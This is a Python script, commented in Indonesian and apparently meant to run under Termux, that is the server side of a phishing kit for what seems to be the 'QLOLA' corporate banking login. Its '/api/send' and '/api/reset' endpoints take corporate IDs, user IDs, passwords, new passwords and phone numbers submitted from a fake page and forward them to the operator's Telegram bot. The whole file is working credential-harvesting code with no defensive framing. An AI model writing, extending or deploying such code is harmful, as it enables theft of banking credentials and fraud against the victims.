import http.server
import socketserver
import json
import urllib.request
import urllib.error
import os
import traceback # Untuk melihat error yang lebih detail

# 1. Cek apakah config.json ada
if not os.path.exists('config.json'):
    print("❌ ERROR: File config.json tidak ditemukan!")
    print("Buat file config.json terlebih dahulu di folder ini.")
    exit()

# Membaca token dari config.json
with open('config.json', 'r') as f:
    config = json.load(f)

TELEGRAM_TOKEN = config.get('TELEGRAM_TOKEN')
TELEGRAM_CHAT_ID = config.get('TELEGRAM_CHAT_ID')

def send_to_telegram(pesan):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = json.dumps({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": pesan,
        "parse_mode": "HTML"
    }).encode('utf-8')
    req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
    urllib.request.urlopen(req)

class MyHandler(http.server.SimpleHTTPRequestHandler):
    # 2. Tambahkan ini agar browser diizinkan mengirim data (CORS)
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    # 3. Handle Preflight Request dari browser
    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)

            if self.path == '/api/send':
                pesan = f"🔐 <b>QLOLA LOGIN</b>\n\n🏢 <b>Corporate:</b> {data.get('corpId')}\n👤 <b>User:</b> {data.get('userId')}\n🔑 <b>Sandi:</b> {data.get('password')}"
                send_to_telegram(pesan)
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status":"success"}')

            elif self.path == '/api/reset':
                pesan = f"🔄 <b>QLOLA RESET PASSWORD</b>\n\n🔑 <b>Sandi Baru:</b> {data.get('newPassword')}\n📱 <b>No HP:</b> +62 {data.get('phone')}"
                send_to_telegram(pesan)
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status":"success"}')
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            print("\n❌ Error saat memproses POST:", e)
            traceback.print_exc() # Menampilkan detail error di terminal
            self.send_response(500)
            self.end_headers()

# 4. Gunakan Threading agar server tidak macet (hang) jika koneksi lambat
class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True # Agar port 8080 bisa langsung dipakai ulang jika server restart

PORT = 8080
with ThreadingTCPServer(("", PORT), MyHandler) as httpd:
    print(f"\n✅ Server berjalan di http://localhost:{PORT}")
    print("Jangan tutup Termux! Buka browser sekarang.\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server dihentikan.")
